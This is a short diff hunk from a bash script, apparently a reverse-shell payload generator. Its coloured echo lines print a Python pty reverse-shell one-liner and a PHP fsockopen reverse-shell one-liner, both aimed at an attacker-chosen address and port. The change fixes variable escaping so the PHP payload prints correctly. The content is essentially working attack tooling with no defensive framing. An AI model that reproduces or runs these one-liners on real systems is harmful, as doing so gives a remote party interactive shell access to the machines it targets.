@@ -156,7 +156,7 @@ do
             echo -e "${LCYAN}export RHOST=\"${RED}$address${LCYAN}\";export RPORT=${RED}$localport${LCYAN};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
             echo ""
             echo -e "${RED}PHP:"
-            echo -e "${LCYAN}php -r '$sock=fsockopen(${RED}\"$address\",$localport${LCYAN});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+            echo -e "${LCYAN}php -r '\$sock=fsockopen(${RED}\"$address\",$localport${LCYAN});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
             echo -e "${WHITE}"
             ;;
             
